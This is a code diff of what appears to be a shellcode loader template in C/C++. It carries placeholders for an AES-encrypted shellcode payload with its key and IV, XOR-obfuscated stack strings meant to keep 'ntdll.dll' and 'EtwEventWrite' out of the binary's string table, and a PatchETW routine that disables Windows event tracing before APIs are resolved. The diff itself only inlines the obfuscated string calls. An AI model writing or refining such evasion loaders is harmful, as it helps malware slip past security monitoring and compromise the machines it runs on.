@@ -54,28 +54,10 @@ struct ObfuscatedString
 unsigned char encrypted_shellcode[] = {${SHELLCODE}};
 unsigned char aes_key[] = {${KEY}};
 unsigned char aes_iv[] = {${IV}};
-// constexpr unsigned char xor_key[] = {${XOR_KEY}};
+
 // ============================================================
 // SECTION 2: Stack Strings (no strings in .rdata)
 // ============================================================
-
-const char *BuildString_ntdll()
-{
-    const char *str = OBFSTR("ntdll.dll", "${XOR_KEY}");
-    return str;
-}
-
-const char *BuildString_kernel32()
-{
-    const char *str = OBFSTR("kernel32.dll", "${XOR_KEY}");
-    return str;
-}
-
-const char *BuildString_EtwEventWrite()
-{
-    const char *str = OBFSTR("EtwEventWrite", "${XOR_KEY}");
-    return str;
-}
 
 // ============================================================
 // SECTION 3: ETW Patching
@@ -83,8 +65,10 @@ const char *BuildString_EtwEventWrite()
 
 void PatchETW()
 {
-    const char *ntdll = BuildString_ntdll();
-    const char *etwFunc = BuildString_EtwEventWrite();
+    // const char *ntdll = BuildString_ntdll();
+    const char *ntdll = OBFSTR("ntdll.dll", "${XOR_KEY}");
+    // const char *etwFunc = BuildString_EtwEventWrite();
+    const char *etwFunc = OBFSTR("EtwEventWrite", "${XOR_KEY}");
 
     HMODULE hNtdll = GetModuleHandleA(ntdll);
     if (!hNtdll)
@@ -242,7 +226,8 @@ int main()
     PatchETW();
 
     // ---- Phase 2: Resolve APIs ----
-    const char *ntdll = BuildString_ntdll();
+    // const char *ntdll = BuildString_ntdll();
+    const char *ntdll = OBFSTR("ntdll.dll", "${XOR_KEY}");
     HMODULE hNtdll = GetModuleHandleA(ntdll);
     if (!hNtdll)
         return 1;
